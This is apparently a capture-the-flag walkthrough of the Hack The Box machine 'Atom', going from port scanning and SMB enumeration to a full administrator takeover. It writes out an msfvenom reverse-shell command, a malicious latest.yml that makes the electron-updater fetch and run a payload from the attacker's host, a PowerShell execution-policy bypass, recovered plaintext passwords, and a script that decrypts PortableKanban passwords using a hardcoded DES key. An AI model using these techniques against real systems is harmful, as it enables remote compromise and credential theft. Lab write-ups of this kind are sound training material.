---
title: HTB-Atom
draft: false
tags:
  - htb
  - windows
  - electron-builder
  - redis
  - redis-dump
  - powerup-ps1
  - asar
  - msfvenom
  - electron-updater
  - cyberchef
  - kanban
  - medium
---
![](https://i.imgur.com/QBaoY6Z.png)

## Information Gathering
### Rustscan

Rustscan finds several ports open. What is interesting is **redis** running on port 6369:

```bash
┌──(yoon㉿kali)-[~/Documents/htb]
└─$ rustscan --addresses 10.10.10.237 --range 1-65535
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Nmap? More like slowmap.🐢
<snip>
Host is up, received syn-ack (0.41s latency).
Scanned at 2024-04-04 11:25:10 EDT for 3s

PORT     STATE    SERVICE      REASON
80/tcp   open     http         syn-ack
135/tcp  open     msrpc        syn-ack
443/tcp  open     https        syn-ack
445/tcp  open     microsoft-ds syn-ack
5985/tcp open     wsman        syn-ack
6379/tcp open     redis        syn-ack
7680/tcp filtered pando-pub    no-response

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 3.17 seconds
```


### Nmap

```bash
┌──(yoon㉿kali)-[~/Documents/htb/atom]
└─$ sudo nmap -sVC -p 80,135,443,445,5985,6379,7680 10.10.10.237 -v
<snip>
Nmap scan report for atom.htb (10.10.10.237)
Host is up (0.28s latency).

PORT     STATE    SERVICE      VERSION
80/tcp   open     http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
135/tcp  open     msrpc        Microsoft Windows RPC
443/tcp  open     ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
|_http-title: 400 Bad Request
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 1024
| Signature Algorithm: sha1WithRSAEncryption
| Not valid before: 2009-11-10T23:48:47
| Not valid after:  2019-11-08T23:48:47
| MD5:   a0a4:4cc9:9e84:b26f:9e63:9f9e:d229:dee0
|_SHA-1: b023:8c54:7a90:5bfa:119c:4e8b:acca:eacf:3649:1ff6
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
| http-methods: 
|   Supported Methods: GET POST OPTIONS HEAD TRACE
|_  Potentially risky methods: TRACE
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
445/tcp  open     microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open     http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open     redis        Redis key-value store
7680/tcp filtered pando-pub
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2024-04-04T08:44:59-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-time: 
|   date: 2024-04-04T15:44:55
|_  start_date: N/A
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_clock-skew: mean: 2h16m33s, deviation: 4h02m33s, median: -3m28s

<snip>
Nmap done: 1 IP address (1 host up) scanned in 65.89 seconds
           Raw packets sent: 12 (504B) | Rcvd: 462 (99.520KB)
```

## Enumeration
### SMB - TCP 445

SMB allows null share listing:

`smbclient -N -L //10.10.10.237`

![](https://i.imgur.com/ieWYiTD.png)


Luckily, I can access **Software_Updates** share without credentials:

![](https://i.imgur.com/VsDcgIi.png)


I will recursively download the entire share:

![](https://i.imgur.com/HvDeAHL.png)


All the clients directories are empty:

![](https://i.imgur.com/yfXp6BS.png)


**UAT_Testing_Procedures.pdf** is an Internal QA documentation for using the **electron builder** note taking app:

![](https://i.imgur.com/LPjBCQX.png)


![](https://i.imgur.com/C2tjcrw.png)


It seems like app is designed to have no server interaction at the moment. However, it says there is an update server running so the app should be ran in a private hardened instance andn if the upates are placed in one of the "client" folders(which I see on SMB shares above), QA team will test it.

Testing for whether upload is allowed in `/Software_Updates`, I can confirm it is allowed:

![](https://i.imgur.com/d12HZU6.png)


But after few seconds it gets deleted, meaning there's some sort of user interaction here:

![](https://i.imgur.com/kiZgEGm.png)


### Redis - TCP 6379
It seems like I would need to come back here after I obtain valid credentials:

`redis-cli -h 10.10.10.237`

![](https://i.imgur.com/OTGXDVP.png)




### HTTP - TCP 80

The site seems to be about simple not taking application:

![](https://i.imgur.com/fOZP1Hp.png)


I can download install file for windows here but distribution for Mac and Linux seems to be still under development:

![](https://i.imgur.com/ptMS5xC.png)


At the bottom of the page, I see **MrR3boot**, which could be a username. Also, I will add **atom.htb** to `/etc/hosts`

![](https://i.imgur.com/NqIOTDN.png)


#### Directory Bruteforce

Everytime I see HTTP running on server, I will always run directory bruteforcing. Windows directories are not case sensitve so using lowercase wordlist will save a lot of time when directory bruteforcing:

`sudo feroxbuster -u http://10.10.10.237 -n -x php -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories-lowercase.txt -C 404`

![](https://i.imgur.com/owgKtOm.png)


Feroxbuster discovers `/releases`, but nothing else other than known zip file is in there:

![](https://i.imgur.com/Cfx7SkB.png)




## Heed Note Taking App

I will first download the zip file:

`sudo curl http://10.10.10.237/releases/heed_setup_v1.0.0.zip --output heed_setup_v1.0.0.zip`

![](https://i.imgur.com/Wjck6Hr.png)


Unzipping the file shows **PE32** executable:

![](https://i.imgur.com/9rePjJG.png)



I will first start **Powershell**:

![](https://i.imgur.com/bbz1u3g.png)


Running executable leads me to a folder named **$PLUGINSDIR**:

![](https://i.imgur.com/2AOkmnc.png)


![](https://i.imgur.com/EMyPgge.png)

There are some dll files and **app-64.7z** zip file in it:

![](https://i.imgur.com/lm5wfGb.png)


I will download and unzip **app-64.7z** using `7z x app-64.7z`.

Now I have bunch of new files to look into:

![](https://i.imgur.com/dqRbXmj.png)



**app-update.yml** file shows **updates.atom.htb**, which I add to `/etc/hosts`:

![](https://i.imgur.com/mR1hnQN.png)


Unfortunately, **updates.atom.htb** is identical to **atom.htb**. 


## Decompile Electron Installer

> The ".asar" file format is associated with Electron applications. Electron is a framework that allows developers to create cross-platform desktop applications using web technologies such as HTML, CSS, and JavaScript.

Let's take a look at **.asar** files in `/resources` folder:

![](https://i.imgur.com/HpxevA7.png)


I will first install **asar** using `sudo npm -g install asar`

I can list files inside app.asar:

`asar l app.asar`

![](https://i.imgur.com/xS3HBcS.png)

I can extract the files inside app.asar but there is nothing interesting in it:

`asar e app.asar .`

![](https://i.imgur.com/UMGFVkj.png)


## Shell as jason
### Electron-Updater RCE

[This article](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html) shows that the vulnerability in Electron-Builder's update mechanism allows an attacker to bypass signature verification, leading to remote command execution due to a fail-open design in the signature validation process.


I will create reverse shell payload using **msfvenom**:

`msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.12 LPORT=1337 -f exe > "r'ev.exe"`

![](https://i.imgur.com/23lN9XI.png)


Now I will calculate payload's **sha512** hash:


`shasum -a 512 "r'ev.exe" | cut -d " " -f1 | xxd -r -p | base64`

![](https://i.imgur.com/dMmUvnu.png)


Then `touch` a file named **latest.yml** and the put the following content in it:

```yml
version: 1.2.3
path: http://10.10.16.12/r'ev.exe
sha512: slEJ4YFQUKGg7w88nxsU+y/pmfpQRpOIjfP8C5JTCQe6tGfDoYnzl/s3bnHJEXDJcAFJlO7HnJ4eRoAc2xcetg==
```

With php http server running, I will the **latest.yml** to **/Software_Updates/client1** share:

![](https://i.imgur.com/BoGJZK3.png)


Within a minute, connection is made:

![](https://i.imgur.com/8o9KA0R.png)


Now on local listener, reverse shell is spawned as **jason**:

![](https://i.imgur.com/bBVrfd4.png)


## Privesc: jason to Administrator
### PowerUp.ps1
I will first upload **PowerUp.ps1**:

![](https://i.imgur.com/LQmtybK.png)


Powershell script execution is restirced:

![](https://i.imgur.com/Gb7H8UH.png)


#### Bypass
- [Guide1](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)
- [Guide2](https://www.hackingarticles.in/window-privilege-escalation-automated-script/)


`Get-ExecutionPolicy` confirms Powershell Script execution it restricted:

![](https://i.imgur.com/YxcQd9B.png)


`Get-ExecutionPolicy -List | Format-Table -AutoSize` usually shows different level of restriction but in this case everything is undefined:

![](https://i.imgur.com/zfWVmly.png)


Bypass is relatively in this case using `powershell -e bypass`:

![](https://i.imgur.com/CdaIhn4.png)


Now using `. ./PowerUp.ps1` execute the script and read the input using **Invoke-AllChecks**:

![](https://i.imgur.com/cqgjXwB.png)


Unfortunately, nothing looks useful here:


### Local Enumeration

Let's start enumerating **redis** since we know that is running on port **6379**.

There are bunch of files in `\Program Files\Redis`:

![](https://i.imgur.com/khHdytW.png)


Luckily, plain-text password is on **redis.windows.conf**: **kidvscat_yes_kidvscat**

`cat redis.windows.conf | grep -i 'pass'`

![](https://i.imgur.com/ZlbZcCM.png)



### Redis Data Dump
I will follow [this guide](https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis#dumping-database) from HackTricks to enumerate redis.

I can sign using the credentials found earlier:

`redis-cli -h 10.10.10.237`

![](https://i.imgur.com/dPUc65l.png)

There is one database here:

![](https://i.imgur.com/MumupVR.png)

I will select the database using `SELECT 0` and list Key inside using `KEYS *`:

![](https://i.imgur.com/p9uG33b.png)

I can dump each key but it is not pretty to look at:

![](https://i.imgur.com/AXovGHT.png)

#### redis-dump

**redis-dump** will help me to dump redis data in a prettier way.

I first download redis dump using the command below:

`npm install redis-dump -g`

Now I will forward the data dump to **database0.txt**

`redis-dump -h atom.htb -p 6379 -a kidvscat_yes_kidvscat > database0.txt`

![](https://i.imgur.com/0Dczpbg.png)

Looking into the dump file, it reveals username and hashed password; **Administrator**:**Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi**

```
'{"Id":"e8e29158d70d44b1a1ba4949d52790a0","Name":"Administrator","Initials":"","Email":"","EncryptedPassword":"Odh7N3L9aVQ8/srdZgG2hIR0SSJoJKGi","Role":"Admin","Inactive":false,"TimeStamp":637530169606440253}'
```

### Hash Cracking

After failing on identifying hash type, I moved on to more enumeration to find out what kind of encryption algorithm it is using.

On `\Users\jason\Downloads`. I see a directory name **PortableKanban**:


![](https://i.imgur.com/FvoE2wK.png)

**PortableKanban** is a tool used to store passwords in an encrypted fashion it seems like there is a way of retrieving encrypted password:

![](https://i.imgur.com/LA4635V.png)

Looking into the exploit python script, it shows that encryption is done using base64 and des encryption with a key: **7ly6UznJ**

```python
import json
import base64
from des import * #python3 -m pip install des
import sys

def decode(hash):

    hash = base64.b64decode(hash.encode('utf-8'))
    key = DesKey(b"7ly6UznJ")
    return key.decrypt(hash,initial=b"XuVUm5fR",padding=True).decode('utf-8')
for user in data["Users"]:
    print("{}:{}".format(user["Name"],decode(user["EncryptedPassword"])))
```

Using **cyberchef**, I can decrypt the hash without using the exploit script: **kidvscat_admin_@123**

![](https://i.imgur.com/0HdJjls.png)

### Evil-Wirm

Now through evil-winrm, I have a shell as the administrator:

![](https://i.imgur.com/y4PM39F.png)


## References
- https://book.hacktricks.xyz/network-services-pentesting/6379-pentesting-redis
- https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html
- https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/
- https://www.hackingarticles.in/window-privilege-escalation-automated-script/
